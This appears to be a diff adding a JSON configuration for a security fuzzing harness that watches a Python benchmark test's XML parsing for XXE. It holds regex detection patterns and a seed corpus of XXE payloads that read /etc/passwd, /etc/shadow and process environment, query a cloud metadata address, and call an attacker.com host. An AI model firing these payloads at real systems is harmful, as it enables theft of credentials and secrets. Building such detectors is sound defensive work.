@@ -1,0 +1,51 @@
+{
+  "monitor": {
+    "strategy": "patch_call",
+    "patch_target": "xml.sax.parseString",
+    "target_arg_index": 0,
+    "target_arg_name": "string",
+    "capture_what": "The XML string argument passed to xml.sax.parseString, which may contain XXE DOCTYPE declarations with external entity references",
+    "additional_imports": [
+      "xml.sax"
+    ]
+  },
+  "oracle_check": {
+    "condition_description": "The XML string passed to the SAX parser contains a DOCTYPE declaration with an external entity reference (SYSTEM or PUBLIC) pointing to a URI such as file:// or http://, confirming an XXE payload is being parsed with external entities enabled",
+    "trigger_patterns": [
+      "<!DOCTYPE\\s+\\w+\\s+\\[",
+      "<!ENTITY\\s+\\w+\\s+SYSTEM\\s+[\"']",
+      "<!ENTITY\\s+\\w+\\s+PUBLIC\\s+",
+      "SYSTEM\\s+[\"']file://",
+      "SYSTEM\\s+[\"']http://",
+      "SYSTEM\\s+[\"']https://",
+      "<!DOCTYPE[^>]*SYSTEM\\s+[\"']"
+    ],
+    "raise_type": "RuntimeError",
+    "raise_message_template": "PY/XXE: XXE payload detected in xml.sax.parseString argument — captured={captured} pattern={matched_pattern}"
+  },
+  "fuzz_guidance": {
+    "seed_corpus": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><data>&xxe;</data>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC \"//\" \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY ext SYSTEM \"file:///proc/self/environ\">]><test>&ext;</test>",
+      "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol SYSTEM \"http://attacker.com/evil\">]><lolz>&lol;</lolz>"
+    ],
+    "skip_condition": "not (b'<?xml' in (data if isinstance(data, bytes) else data.encode('utf-8', errors='replace')) or b'<!DOCTYPE' in (data if isinstance(data, bytes) else data.encode('utf-8', errors='replace')))"
+  },
+  "_meta": {
+    "function": "BenchmarkTest00460_post",
+    "file": "testcode/BenchmarkTest00460.py",
+    "input_strategy": "flask_view",
+    "function_signature": "def BenchmarkTest00460_post(self)",
+    "tainted_params": [
+      {
+        "name": "BenchmarkTest00460",
+        "index": -1,
+        "type": "str"
+      }
+    ],
+    "model": "anthropic/claude-sonnet-4-6"
+  }
+}
